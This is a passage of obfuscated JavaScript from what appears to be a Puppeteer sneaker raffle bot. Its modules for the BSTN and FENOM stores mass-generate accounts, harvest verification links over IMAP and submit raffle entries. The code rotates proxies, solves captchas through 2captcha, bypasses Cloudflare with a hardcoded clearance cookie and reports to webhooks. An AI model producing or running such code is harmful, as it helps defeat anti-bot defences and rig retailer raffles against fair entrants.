                            }), await _0x5519f3['goto']('' + _0x5c9e99), await _0x5519f3['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x5519f3['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xbec2fc(0x7d0), console['log'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xbec2fc(0x190), await _0x5519f3['waitForSelector']('#firstname'), await _0x5519f3['type']('#firstname', _0x541a56[_0x14b5c0]['FirstName'], { 'delay': 0xf0 }), await _0xbec2fc(0x190), await _0x5519f3['type']('#lastname', _0x541a56[_0x14b5c0]['LastName'], { 'delay': 0xe6 }), await _0xbec2fc(0x190), await _0x5519f3['type']('#email_address', _0x541a56[_0x14b5c0]['Email'], { 'delay': 0x122 }), await _0xbec2fc(0x190), await _0x5519f3['type']('#password', _0x541a56[_0x14b5c0]['Password'], { 'delay': 0x82 }), await _0xbec2fc(0x1f4), await _0x5519f3['type']('#password-confirmation', _0x541a56[_0x14b5c0]['Password'], { 'delay': 0x7c }), console['log'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xbec2fc(0x2bc), await _0x5519f3['$eval']('#form-validate', _0xa7effb => _0xa7effb['submit']()), await _0xbec2fc(0x1388);
                            const _0x503987 = await _0x5519f3['$']('#email_address-error');
                            if (_0x503987)
                                throw new Error('Invalid\x20Email');
                            const _0x10bce3 = await _0x5519f3['$']('#password-error');
                            if (_0x10bce3)
                                throw new Error('Invalid\x20Password');
                            await _0x5519f3['waitForSelector']('div.mesg-success'), _0xc99efe = 'no', console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20:\x20Account\x20' + _0x541a56[_0x14b5c0]['Email'] + '\x20Generated')), _0x5b2323['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x541a56[_0x14b5c0]['Email'] + ',' + _0x541a56[_0x14b5c0]['Password']);
                            try {
                                _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0xf1a9f4['succesDEVMSG']);
                            } catch {
                            }
                            await _0x4f1a4a(_0x540a14, _0xf1a9f4['succesDEVMSG']), console['log'](_0xe1d9e['yellow'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
                        } catch (_0x365d7e) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20:\x20' + _0x365d7e)), _0x3a7c1e = '' + _0x365d7e;
                            var _0x41bbff = await _0x597409(_0x541a56[_0x14b5c0], _0x4796a5, 'acc', !![], _0x3a7c1e);
                            _0xf1a9f4['errorDEV'] = { 'embeds': [_0x41bbff] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0xf1a9f4['errorDEV']), await _0x4f1a4a(_0x166efb, _0xf1a9f4['errorDEV']), _0xc99efe = 'yes';
                        } finally {
                            _0xc3c743['close']();
                            if (_0xc99efe == 'yes' && _0x49a290 != 0x5) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Task\x20' + (_0x14b5c0 + 0x1) + '\x20:\x20Retrying')), _0x14b5c0 = _0x14b5c0 - 0x1, _0x49a290 = _0x49a290 + 0x1;
                                continue;
                            }
                            _0xc99efe == 'yes' && _0x49a290 >= 0x5 && (_0x176a1f(_0x541a56[_0x14b5c0], _0x4796a5), _0xc99efe = 'no', _0x49a290 = 0x0), console['log'](_0x27df86() + '\x20[' + _0x4796a5['name'] + ']\x20Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4d012e, _0x5a5de8, _0x25654c) {
                    var _0x5a5de8 = [];
                    async function _0x49cb02() {
                        var _0x3c1230 = new _0x1c5c24({
                            'user': _0x1c5a09['masterMail'],
                            'password': _0x1c5a09['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4bc282(_0x4d8a09) {
                            _0x3c1230['openBox']('INBOX', ![], _0x4d8a09);
                        }
                        _0x3c1230['once']('ready', function () {
                            _0x4bc282(function (_0x8942e7, _0x5643c1) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x8942e7)
                                    throw _0x8942e7;
                                _0x3c1230['seq']['search'](['UNSEEN'], function (_0x138fb2, _0x3342dd) {
                                    if (!_0x3342dd || !_0x3342dd['length'])
                                        console['log'](_0x27df86() + '\x20[' + _0x4d012e['name'] + ']\x20No\x20mails\x20found'), _0x3c1230['end']();
                                    else {
                                        var _0x2b493f = _0x3c1230['seq']['fetch'](_0x3342dd, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2b493f['on']('message', function (_0x4bcd9d, _0x3a1408) {
                                            var _0x563353 = '(#' + _0x3a1408 + ')\x20';
                                            _0x4bcd9d['on']('body', function (_0x586637, _0x3e6e54) {
                                                _0x39d64d(_0x586637, (_0x5beb43, _0x2b9d1e) => {
                                                    if (_0x2b9d1e['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0x5fd7ba = _0x2b9d1e['text']['split']('[')[0x2], _0x3fe900 = _0x5fd7ba['split'](']')[0x0], _0xb0aa8d = _0x2b9d1e['html']['split']('\x0a');
                                                        _0x5a5de8['push'](_0x3fe900);
                                                    }
                                                });
                                            }), _0x4bcd9d['once']('end', function () {
                                            });
                                        }), _0x2b493f['once']('error', function (_0x155a13) {
                                            console['log']('Fetch\x20error:\x20' + _0x155a13);
                                        }), _0x2b493f['once']('end', function () {
                                            _0x3c1230['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3c1230['once']('error', function (_0x5198ab) {
                            console['log'](_0xe1d9e['red'](_0x5198ab['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x3c1230['once']('end', async function () {
                        }), _0x3c1230['connect']();
                    }
                    async function _0x54ef0b(_0x313643, _0x2b0954, _0x4b7c5a) {
                        _0x59f17d['use'](_0x1f6810());
                        for (var _0x2d4fe1 = 0x0; _0x2d4fe1 < _0x2b0954['length']; _0x2d4fe1++) {
                            if (_0x1206f1 != 'yes')
                                var _0x1206f1 = '', _0x444bfe = 0x0;
                            var _0x186168 = Math['round'](Math['random']() * (_0x4b7c5a['length'] - 0x1)), _0x4a9ff2 = _0x4b7c5a[_0x186168]['split'](':');
                            const _0x1dce76 = await _0x59f17d['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a9ff2[0x0] + ':' + _0x4a9ff2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x43382c = await _0x1dce76['newPage']();
                                await _0x43382c['authenticate']({
                                    'username': '' + _0x4a9ff2[0x2],
                                    'password': '' + _0x4a9ff2[0x3]
                                }), console['log'](_0x27df86() + '\x20[' + _0x313643['name'] + ']\x20Task\x20' + (_0x2d4fe1 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x43382c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x43382c['setRequestInterception'](!![]), _0x43382c['on']('request', _0x353410 => {
                                    _0x353410['resourceType']() === 'image' || _0x353410['resourceType']() === 'font' || _0x353410['resourceType']() === 'media' ? _0x353410['abort']() : _0x353410['continue']();
                                }), console['log'](_0x27df86() + '\x20[' + _0x313643['name'] + ']\x20Task\x20' + (_0x2d4fe1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x43382c['goto'](_0x2b0954[_0x2d4fe1]), console['log'](_0x27df86() + '\x20[' + _0x313643['name'] + ']\x20Task\x20' + (_0x2d4fe1 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x43382c['waitForTimeout'](0xbb8);
                                try {
                                    await _0x43382c['waitForSelector']('.account-nav'), _0x1206f1 = 'no', console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x313643['name'] + ']\x20Task\x20' + (_0x2d4fe1 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0xc7ee10 = await _0x597409(null, _0x313643, 'ver', ![]);
                                    const _0x5d4721 = { 'succesDEVMSG': { 'embeds': [_0xc7ee10] } };
                                    await _0x4f1a4a(_0x51d91d, _0x5d4721['succesDEVMSG']);
                                } catch (_0x1e50fb) {
                                    throw new Error(_0x1e50fb);
                                }
                            } catch (_0x3b7834) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x313643['name'] + ']\x20Task\x20' + (_0x2d4fe1 + 0x1) + '\x20:\x20' + _0x3b7834));
                                var _0x3cad5e = _0x3b7834, _0x20be80 = await _0x597409(null, _0x313643, 'ver', !![], _0x3cad5e);
                                const _0x422a3b = { 'errorDEVMSG': { 'embeds': [_0x20be80] } };
                                _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x422a3b['errorDEVMSG']), await _0x4f1a4a(_0x166efb, _0x422a3b['errorDEVMSG']), _0x1206f1 = 'yes';
                            } finally {
                                _0x1dce76['close']();
                                if (_0x1206f1 == 'yes' && _0x444bfe != 0x5) {
                                    console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x313643['name'] + ']\x20Task\x20' + (_0x2d4fe1 + 0x1) + '\x20:\x20Retrying')), _0x2d4fe1 = _0x2d4fe1 - 0x1, _0x444bfe = _0x444bfe + 0x1;
                                    continue;
                                }
                                _0x1206f1 == 'yes' && _0x444bfe >= 0x5 && (_0x1206f1 = 'no', _0x444bfe = 0x0), console['log'](_0x27df86() + '\x20[' + _0x313643['name'] + ']\x20Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                            }
                        }
                    }
                    try {
                        _0x49cb02(), await _0xbec2fc(0xfa0), console['log']('Found\x20' + _0x5a5de8['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x54ef0b(_0x4d012e, _0x5a5de8, _0x25654c);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4e47fa, _0x1f86db, _0x2f9d92) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5aff30 = 0x0; _0x5aff30 < _0x1f86db['length']; _0x5aff30++) {
                        var _0x17afb1;
                        await _0x200aab(_0x1f86db, _0x5aff30);
                        if (_0x159449 != 'yes')
                            var _0x159449 = '', _0x2aea3a = 0x0;
                        _0x2167ba(_0x4e47fa['name'] + '\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20/\x20' + _0x1f86db['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21);
                        var _0x440f33 = Math['round'](Math['random']() * (_0x2f9d92['length'] - 0x1)), _0x3df7cd = _0x2f9d92[_0x440f33]['split'](':'), _0x181765;
                        try {
                            _0x181765 = await _0x59f17d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3df7cd[0x0] + ':' + _0x3df7cd[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x181765 = await _0x59f17d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x3df7cd[0x0] + ':' + _0x3df7cd[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x412bd4 = await _0x181765['newPage'](), _0xf07391 = await _0x412bd4['target']()['createCDPSession'](), { windowId: _0x53b51b } = await _0xf07391['send']('Browser.getWindowForTarget');
                            await _0x412bd4['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x253879 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x412bd4['authenticate']({
                                'username': '' + _0x3df7cd[0x2],
                                'password': '' + _0x3df7cd[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x412bd4['goto']('' + _0x1f86db[_0x5aff30]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x412bd4['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0xf07391['send']('Browser.setWindowBounds', {
                                'windowId': _0x53b51b,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xbec2fc(0x1388), await _0x412bd4['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x412bd4['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xbec2fc(0x1f4), console['log'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Logging\x20in'), await _0x412bd4['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x1d3204 => _0x1d3204['click']()), await _0x412bd4['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x412bd4['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xbec2fc(0x7d0), await _0x412bd4['waitForSelector']('#email-login'), await _0x412bd4['type']('#email-login', '' + _0x1f86db[_0x5aff30]['Email']), await _0xbec2fc(0xdac), await _0x412bd4['waitForSelector']('#password'), await _0x412bd4['type']('#password', '' + _0x1f86db[_0x5aff30]['Password'], { 'delay': 0xe6 }), await _0xbec2fc(0x157c);
                            try {
                                await _0x412bd4['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x783d6b => _0x783d6b['click']());
                            } catch {
                            }
                            try {
                                await _0x412bd4['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x3136da) {
                            }
                            await _0xbec2fc(0x3e8);
                            const _0x395d23 = await _0x412bd4['$']('.enteredDraw_container__2KmQ_');
                            if (_0x395d23)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x1f86db[_0x5aff30]['Size']);
                            if (_0x1f86db[_0x5aff30]['Size'] != 'RANDOM') {
                                var _0x1d7e2c = _0x1f86db[_0x5aff30]['Size']['replace']('.', ',');
                                const _0x2732f3 = await _0x412bd4['$x']('//div[contains(text(),\x20' + _0x1d7e2c + ')]');
                                await _0x2732f3[0x0]['click']();
                            } else {
                                const _0x2a09dd = await _0x412bd4['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x272d34 = Math['round'](Math['random']() * (_0x2a09dd['length'] - 0x1));
                                await _0x2a09dd[_0x272d34]['click']();
                            }
                            await _0xbec2fc(0x1f4);
                            const _0x133794 = await _0x412bd4['$']('.addressList_addressItem__LE2PB');
                            if (_0x133794 && _0x1f86db[_0x5aff30]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x412bd4['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0xbec2fc(0x5dc), await _0x412bd4['waitForSelector']('#firstname'), await _0x412bd4['type']('#firstname', '' + _0x1f86db[_0x5aff30]['FirstName']), await _0xbec2fc(0x1f4), await _0x412bd4['waitForSelector']('#firstname'), await _0x412bd4['type']('#lastname', '' + _0x1f86db[_0x5aff30]['LastName']), await _0xbec2fc(0x1f4), await _0x412bd4['waitForSelector']('#firstname'), await _0x412bd4['type']('#street', '' + _0x1f86db[_0x5aff30]['Address1']), await _0xbec2fc(0x1f4), await _0x412bd4['waitForSelector']('#firstname'), await _0x412bd4['type']('#houseNumber', _0x1f86db[_0x5aff30]['HouseNumber'] + '\x20' + _0x1f86db[_0x5aff30]['Address2']), await _0xbec2fc(0x1f4), await _0x412bd4['waitForSelector']('#firstname'), await _0x412bd4['select']('#country_code', '' + _0x1f86db[_0x5aff30]['Country']), await _0xbec2fc(0x1f4), await _0x412bd4['type']('#postcode', '' + _0x1f86db[_0x5aff30]['Zip']), await _0xbec2fc(0x1f4), await _0x412bd4['type']('#city', '' + _0x1f86db[_0x5aff30]['City']), await _0xbec2fc(0x1f4), await _0x412bd4['type']('#telephone', '' + _0x1f86db[_0x5aff30]['Phone']), await _0xbec2fc(0x1f4), await _0x412bd4['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0xbec2fc(0x9c4);
                            try {
                                await _0x412bd4['type']('#instagram_name', '' + _0x1f86db[_0x5aff30]['Follower']), await _0x412bd4['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xbec2fc(0x5dc);
                            try {
                                await _0x412bd4['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0xbec2fc(0x5dc), await _0x412bd4['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x2dcdf2 => _0x2dcdf2['click']()), await _0xbec2fc(0x1388);
                            try {
                                await _0x412bd4['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x412bd4['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x1f86db[_0x5aff30]['Size'] != 'RANDOM') {
                                    var _0x1d7e2c = _0x1f86db[_0x5aff30]['Size']['replace']('.', ',');
                                    const _0x20aa80 = await _0x412bd4['$x']('//div[contains(text(),\x20' + _0x1d7e2c + ')]');
                                    await _0x20aa80[0x0]['click']();
                                } else {
                                    const _0x30c1dd = await _0x412bd4['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x272d34 = Math['round'](Math['random']() * (_0x30c1dd['length'] - 0x1));
                                    await _0x30c1dd[_0x272d34]['click']();
                                }
                                await _0xbec2fc(0x5dc);
                                try {
                                    await _0x412bd4['hover']('#instagram_name'), await _0x412bd4['type']('#instagram_name', '' + _0x1f86db[_0x5aff30]['Follower']), await _0x412bd4['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Retrying'), await _0x412bd4['hover']('.checkBox_boxHolder__wLGVe'), await _0xbec2fc(0x5dc), await _0x412bd4['click']('.checkBox_boxHolder__wLGVe'), await _0xbec2fc(0x157c), await _0x412bd4['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x49cb66 => _0x49cb66['click']()), await _0xbec2fc(0x1388), await _0x412bd4['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x159449 = 'no', _0x498d8e(_0x1f86db[_0x5aff30], _0x4e47fa), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0xe6ed74 = await _0x597409(_0x1f86db[_0x5aff30], _0x4e47fa, 'dev', ![]), _0x23d2b1 = await _0x597409(_0x1f86db[_0x5aff30], _0x4e47fa, 'pub', ![]);
                            const _0x1e7a69 = {
                                'succesDEVMSG': { 'embeds': [_0xe6ed74] },
                                'succesPUBMSG': { 'embeds': [_0x23d2b1] }
                            };
                            try {
                                _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x1e7a69['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x1e7a69['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x53e58f, _0x1e7a69['succesPUBMSG']);
                            } catch (_0x5e7bdb) {
                                console['log'](_0xe1d9e['yellow'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5e7bdb));
                            }
                        } catch (_0x485e87) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20' + _0x485e87)), _0x159449 = 'yes', _0x17afb1 = '' + _0x485e87;
                            var _0x5914f0 = await _0x597409(_0x1f86db[_0x5aff30], _0x4e47fa, 'dev', !![], _0x17afb1), _0xe6ed74 = await _0x597409(_0x1f86db[_0x5aff30], _0x4e47fa, 'dev', ![]), _0x23d2b1 = await _0x597409(_0x1f86db[_0x5aff30], _0x4e47fa, 'pub', ![]);
                            const _0x5cde62 = {
                                'succesDEVMSG': { 'embeds': [_0xe6ed74] },
                                'succesPUBMSG': { 'embeds': [_0x23d2b1] }
                            };
                            _0x5cde62['errorDEV'] = { 'embeds': [_0x5914f0] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x5cde62['errorDEV']), await _0x4f1a4a(_0x166efb, _0x5cde62['errorDEV']);
                        } finally {
                            _0x181765['close']();
                            if (_0x159449 == 'yes' && _0x2aea3a != 0x5) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Task\x20' + (_0x5aff30 + 0x1) + '\x20:\x20Retrying')), _0x5aff30 = _0x5aff30 - 0x1, _0x2aea3a = _0x2aea3a + 0x1;
                                continue;
                            }
                            _0x159449 == 'yes' && _0x2aea3a >= 0x5 && (_0x176a1f(_0x1f86db[_0x5aff30], _0x4e47fa), _0x159449 = 'no', _0x2aea3a = 0x0), console['log'](_0x27df86() + '\x20[' + _0x4e47fa['name'] + ']\x20Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x5bfe40, _0x2d134a, _0x4a6d02) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x16516d = 0x0; _0x16516d < _0x2d134a['length']; _0x16516d++) {
                        if (_0x54e887 != 'yes')
                            var _0x54e887 = '', _0x94639e = 0x0;
                        var _0xf09ac6;
                        await _0x200aab(_0x2d134a, _0x16516d), _0x2167ba(_0x5bfe40['name'] + '\x20Task\x20' + (_0x16516d + 0x1) + '\x20/\x20' + _0x2d134a['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21);
                        var _0x236364 = await _0x597409(_0x2d134a[_0x16516d], _0x5bfe40, 'acc', ![]);
                        const _0x285c3a = { 'succesDEVMSG': { 'embeds': [_0x236364] } }, _0x49a85d = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x20a823 = Math['round'](Math['random']() * (_0x4a6d02['length'] - 0x1)), _0x2b4b3f = _0x4a6d02[_0x20a823]['split'](':'), _0x292a49;
                        try {
                            _0x292a49 = await _0x59f17d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2b4b3f[0x0] + ':' + _0x2b4b3f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x292a49 = await _0x59f17d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2b4b3f[0x0] + ':' + _0x2b4b3f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x31034b = await _0x292a49['newPage']();
                            await _0x31034b['setViewport']({
                                'width': 0x500 + _0x3da0ff(0x1, 0x32),
                                'height': 0x2d9 + _0x3da0ff(0x1, 0x32)
                            });
                            const _0x10b8d6 = await _0x31034b['target']()['createCDPSession'](), { windowId: _0x4b8384 } = await _0x10b8d6['send']('Browser.getWindowForTarget');
                            await _0x31034b['authenticate']({
                                'username': '' + _0x2b4b3f[0x2],
                                'password': '' + _0x2b4b3f[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0x5bfe40['name'] + ']\x20Task\x20' + (_0x16516d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x31034b['goto']('' + _0x49a85d, { 'waitUntil': 'networkidle2' }), await _0xbec2fc(0x1388), console['log'](_0x27df86() + '\x20[' + _0x5bfe40['name'] + ']\x20Task\x20' + (_0x16516d + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x22eb24 = await _0x31034b['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x22eb24 && await _0x22eb24['click']();
                            } catch {
                            }
                            await _0x10b8d6['send']('Browser.setWindowBounds', {
                                'windowId': _0x4b8384,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x31034b['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0xbec2fc(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x27df86() + '\x20[' + _0x5bfe40['name'] + ']\x20Task\x20' + (_0x16516d + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x31034b['type']('input[name=\x22firstname\x22]', '' + _0x2d134a[_0x16516d]['FirstName']), await _0xbec2fc(0x1f4), await _0x31034b['type']('input[name=\x22lastname\x22]', '' + _0x2d134a[_0x16516d]['LastName']), await _0xbec2fc(0x1f4), await _0x31034b['type']('input[name=\x22email\x22]', '' + _0x2d134a[_0x16516d]['Email']), await _0xbec2fc(0x1f4), await _0x31034b['type']('input[name=\x22password\x22]', '' + _0x2d134a[_0x16516d]['Password']), await _0xbec2fc(0x258), await _0x31034b['$eval']('input[name=\x22psgdpr\x22]', _0xb54231 => _0xb54231['click']()), await _0xbec2fc(0x1f4), console['log'](_0x27df86() + '\x20[' + _0x5bfe40['name'] + ']\x20Task\x20' + (_0x16516d + 0x1) + '\x20:\x20Sending\x20Request'), await _0x31034b['$eval']('#customer-form', _0x15e4fd => _0x15e4fd['submit']());
                            try {
                                await _0x31034b['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), _0x54e887 = 'no', console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x5bfe40['name'] + ']\x20Task\x20' + (_0x16516d + 0x1) + '\x20:\x20Account\x20' + _0x2d134a[_0x16516d]['Email'] + '\x20Generated')), _0x5b2323['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2d134a[_0x16516d]['Email'] + ',' + _0x2d134a[_0x16516d]['Password']);
                                try {
